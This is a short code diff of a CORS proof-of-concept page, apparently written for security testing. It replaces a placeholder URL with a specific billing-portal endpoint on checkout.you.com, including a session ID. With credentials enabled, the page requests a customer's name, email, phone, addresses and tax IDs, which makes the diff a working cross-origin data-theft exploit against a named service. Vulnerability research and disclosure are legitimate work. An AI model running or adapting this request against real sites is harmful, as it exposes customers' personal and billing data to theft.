@@ -21,7 +21,7 @@
             req.onerror = function() {
                 document.getElementById('result').innerText = 'CORS request failed';
             };
-            req.open('GET', 'https://test.com/api/sensitive-data', true);
+            req.open('GET', 'https://checkout.you.com/v1/billing_portal/sessions/bps_1Pw06fETU8N2v5f4hdkacCgL/customer?include_only%5B%5D=id%2Cname%2Cemail%2Cphone%2Caddress.city%2Caddress.country%2Caddress.line1%2Caddress.line2%2Caddress.postal_code%2Caddress.state%2Cshipping.address.city%2Cshipping.address.country%2Cshipping.address.line1%2Cshipping.address.line2%2Cshipping.address.postal_code%2Cshipping.address.state%2Ctax_ids.data.id%2Ctax_ids.data.value%2Ctax_ids.data.type%2Ctax_ids.data.country%2Cemail_updatable', true);
             req.withCredentials = true;
             req.send();
         }
